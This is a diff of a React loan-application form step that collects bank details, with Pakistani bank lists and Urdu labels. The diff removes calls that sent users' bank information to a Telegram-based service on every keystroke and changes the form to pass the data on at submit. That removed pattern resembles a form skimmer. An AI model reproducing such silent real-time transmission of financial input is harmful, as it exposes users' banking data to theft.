@@ -2,12 +2,11 @@ import React, { useState } from 'react';
 import { BankInfo } from '../types';
 import { PAKISTAN_BANKS, LOAN_PURPOSES, OCCUPATIONS } from '../data/mockData';
 import { ArrowRight, ArrowLeft, Info } from 'lucide-react';
-import { sendRealtimeBankInfoUpdate } from '../services/telegramService';
 
 interface Step2Props {
   data: BankInfo;
   onUpdate: (updated: Partial<BankInfo>) => void;
-  onNext: () => void;
+  onNext: (data?: BankInfo) => void;
   onBack: () => void;
 }
 
@@ -20,18 +19,14 @@ export const Step2BankInfo: React.FC<Step2Props> = ({
   const [errors, setErrors] = useState<Record<string, string>>({});
 
   const handleGenericBankUpdate = (field: keyof BankInfo, value: string) => {
-    const updated = { ...data, [field]: value };
     onUpdate({ [field]: value });
-    sendRealtimeBankInfoUpdate(updated);
     if (errors[field]) setErrors((prev) => ({ ...prev, [field]: '' }));
   };
 
   const handleNumericBankUpdate = (field: keyof BankInfo, rawVal: string) => {
     const val = rawVal.replace(/\D/g, '');
     const formatted = val ? parseInt(val, 10).toLocaleString('en-PK') : '';
-    const updated = { ...data, [field]: formatted };
     onUpdate({ [field]: formatted });
-    sendRealtimeBankInfoUpdate(updated);
     if (errors[field]) setErrors((prev) => ({ ...prev, [field]: '' }));
   };
 
@@ -56,7 +51,7 @@ export const Step2BankInfo: React.FC<Step2Props> = ({
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     if (validate()) {
-      onNext();
+      onNext(data);
     }
   };
 
@@ -256,7 +251,7 @@ export const Step2BankInfo: React.FC<Step2Props> = ({
             type="button"
             onClick={onBack}
             id="step2-back-btn"
-            className="flex-1 py-3 px-4 border border-slate-300 hover:bg-slate-50 text-slate-700 font-semibold text-xs rounded-lg transition-colors flex items-center justify-center gap-1.5"
+            className="flex-1 py-3 px-4 border border-slate-300 hover:bg-slate-50 text-slate-700 font-semibold text-xs rounded-lg transition-colors flex items-center justify-center gap-1.5 cursor-pointer"
           >
             <ArrowLeft className="w-4 h-4" />
             <span>Back / واپس</span>
@@ -265,7 +260,7 @@ export const Step2BankInfo: React.FC<Step2Props> = ({
           <button
             type="submit"
             id="step2-continue-btn"
-            className="flex-1 py-3 px-4 bg-[#0f2848] hover:bg-[#163a66] active:bg-[#0b1c33] text-white font-bold text-xs rounded-lg transition-all shadow-sm flex items-center justify-center gap-1.5"
+            className="flex-1 py-3 px-4 bg-[#0f2848] hover:bg-[#163a66] active:bg-[#0b1c33] text-white font-bold text-xs rounded-lg transition-all shadow-sm flex items-center justify-center gap-1.5 cursor-pointer"
           >
             <span>Continue / جاری رکھیں</span>
             <ArrowRight className="w-4 h-4" />
@@ -275,4 +270,3 @@ export const Step2BankInfo: React.FC<Step2Props> = ({
     </div>
   );
 };
-
